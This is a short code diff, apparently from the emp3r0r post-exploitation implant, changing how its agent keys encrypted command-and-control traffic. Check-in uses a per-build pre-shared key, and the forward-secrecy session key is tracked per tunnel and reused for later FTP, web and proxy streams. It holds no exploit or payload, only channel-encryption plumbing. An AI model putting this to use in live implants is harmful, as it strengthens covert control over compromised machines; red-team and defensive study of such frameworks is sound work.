@@ -39,9 +39,11 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	}
 	defer conn.Close()
 
-	// Global Encryption: Wrap connection with PSK
-	// Note: EstablishC2Connection already wraps with SecureConn before sending MsgAuth.
-	// Here we need a fresh SecureConn for the agent data payload that follows.
+	// Global Encryption: Wrap connection with the per-build PSK.
+	// Check-in is the bootstrap route: it always runs before the PFS handshake,
+	// so it is encrypted with def.AESPassword (never the ephemeral session key).
+	// EstablishC2Connection already sent the MsgAuth envelope over a SecureConn;
+	// NewSecureConn is idempotent and simply hands that same stream back.
 	secureConn := transport.NewSecureConn(conn)
 
 	out := cbor.NewEncoder(secureConn)
@@ -150,9 +152,23 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 	}
 	pubKeyBytes := transport.SerializePublicKey(&privKey.PublicKey)
 
+	// A fresh session starts on the per-build PSK. Whatever session key was
+	// left behind by a previous tunnel is stale — drop it now so the handshake
+	// below always starts from the static PSK.
+	clearCurrentSessionKey()
+
 	// check for CC server's response
 	go func() {
+		// The ephemeral key this tunnel negotiated (if any). The read loop owns
+		// it: when the tunnel dies (read error / EOF / cancel) this goroutine is
+		// the one that observed it, and it clears the key it set — but only if a
+		// newer tunnel has not already replaced it (a racing reconnect or a
+		// second in-process tunnel installs its own key via setCurrentSessionKey).
+		var ownKey []byte
 		defer func() {
+			if len(ownKey) > 0 {
+				clearCurrentSessionKeyIf(ownKey)
+			}
 			if r := recover(); r != nil {
 				logging.Errorf("MsgTunneler response listener panic: %v\n%s", r, util.CallStack())
 			}
@@ -212,6 +228,14 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 				secureConn.SetKey(sessionKey)
 				logging.Successf("SecureConn: Switched to ephemeral session key (PFS enabled)")
 				pfsKeysExchanged = true
+				// Remember the key this tunnel negotiated so teardown only clears
+				// it if a newer session has not already replaced it.
+				cpy := make([]byte, len(sessionKey))
+				copy(cpy, sessionKey)
+				ownKey = cpy
+				// Publish the PFS key: every subsequent agent↔C2 stream (FTP, WWW,
+				// proxy) that EstablishC2Connection opens is re-keyed to it.
+				setCurrentSessionKey(sessionKey)
 
 				// Notify wait_hello that handshake is done
 				if waiting {
